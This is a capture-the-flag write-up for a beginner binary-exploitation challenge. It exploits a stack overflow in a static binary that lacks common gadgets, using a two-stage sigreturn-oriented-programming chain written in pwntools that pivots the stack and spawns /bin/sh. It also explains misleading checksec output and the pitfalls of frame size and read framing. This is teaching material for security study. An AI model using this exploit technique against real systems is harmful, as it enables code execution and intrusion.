# No win

- Category: pwn
- Difficulty: beginner
- Author: hoover

"The flag is located at /flag.txt" — that is the entire prompt. The name is the hint: there is no `win()`, and the usual ret2libc gadgets have been removed from the binary on purpose, which leaves SROP as the only way to build a syscall.

### Solution:

##### 1. `checksec` says canary, `main` disagrees

```c
int main(void) {
    char buf[64];
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("no win(), so good luck");
    printf("> ");
    read(STDIN_FILENO, buf, 512);
    return 0;
}
```

`checksec` reports `Canary Found`, but that only means `__stack_chk_fail` is linked into the static libc — it says nothing about this function. `main` never touches it:

```asm
401909:  push   rbp
40190a:  mov    rbp,rsp
40190d:  sub    rsp,0x40           ; buf at rbp-0x40, no canary slot
401952:  lea    rax,[rbp-0x40]
401956:  mov    edx,0x200          ; read 512 into a 64-byte buffer
401963:  call   41feb0 <__libc_read>
40196d:  leave
40196e:  ret
```

64 bytes of buffer plus 8 for the saved `rbp` puts the return address at offset **72**, with 440 bytes to spare. Static and non-PIE, so no leak is needed either.

##### 2. The gadgets are deliberately missing

A static glibc normally hands you every gadget you could want. Scanning the executable segments for the raw bytes says otherwise:

```
pop rdi; ret     0 hits
pop rsi; ret     0 hits
pop rdx; ret     1 hits  ['0x413210']
pop rax; ret     2 hits  ['0x427eeb', '0x4282ed']
syscall; ret     3 hits  ['0x410f46', '0x410f65', '0x45f899']
```

No `pop rdi` and no `pop rsi` anywhere means no ordinary syscall chain and no ret2libc. But `pop rax; ret` plus `syscall; ret` is exactly the pair SROP needs: set `rax = 15`, `syscall`, and the kernel restores *every* register from a `sigcontext` it reads off the stack — arguments included.

##### 3. Two sigreturns

There is not enough room for a shell in one frame, so stage 1 buys space and stage 2 spends it:

```python
f = SigreturnFrame()
f.rax, f.rdi, f.rsi, f.rdx = constants.SYS_read, 0, STAGE, 0x400
f.rip, f.rsp = SYSCALL, STAGE          # pivot the stack into .bss
stage1 = (b'A'*72 + p64(POP_RAX) + p64(15) + p64(SYSCALL) + bytes(f)).ljust(512, b'\x00')
```

After `rt_sigreturn` the registers are ours, `rip` is the `syscall; ret` gadget, so the `syscall` runs `read(0, STAGE, 0x400)` and the trailing `ret` pops straight out of `STAGE` — which the read just filled. `rsi` and `rsp` are deliberately the same address, so stage 2 lands exactly on the new stack:

```python
g = SigreturnFrame()
g.rax, g.rsi, g.rdx, g.rip = constants.SYS_execve, 0, 0, SYSCALL
binsh_off = 24 + len(bytes(g))
g.rdi = STAGE + binsh_off
stage2 = p64(POP_RAX) + p64(15) + p64(SYSCALL) + bytes(g) + b'/bin/sh\x00'
```

Two details cost a debugging round each:

- **The frame is 304 bytes here, not the 248 usually quoted.** Hardcoding the `/bin/sh` offset put `rdi` past the string and `execve` returned `-ENOENT`; deriving it from `len(bytes(g))` fixes it.
- **`read(..., 512)` will happily swallow both stages.** Sending stage 1 as 400 bytes let the first read consume it *plus* the first 112 bytes of stage 2, leaving the second read misaligned and `ret`ing to 0. Padding stage 1 to exactly 512 makes the framing deterministic.

```
$ ./solve.py no-win-scenario-ffa1fdf00e54.chall.nnsc.tf:1337
NNS{N0_win_FuNC710n_so_yoU_BUil7_Y0ur_0Wn_sy5ca11}
```

Full script: [solve.py](solve.py)

**Flag:** `NNS{N0_win_FuNC710n_so_yoU_BUil7_Y0ur_0Wn_sy5ca11}`

### Takeaways

- `checksec`'s "Canary Found" on a **static** binary is close to meaningless — it detects the symbol in the linked libc, not instrumentation in the function you are attacking. Read the prologue before believing you need a leak.
- An absent `pop rdi` in a static binary is a design decision, not bad luck, and it points at SROP: `pop rax; ret` + `syscall; ret` is the whole requirement, and one frame sets every register at once.
- Derive the sigframe size from `len(bytes(frame))` rather than the 248 everyone quotes; pwntools' layout varies and a wrong offset shows up as a plausible-looking `-ENOENT`, not as a crash.
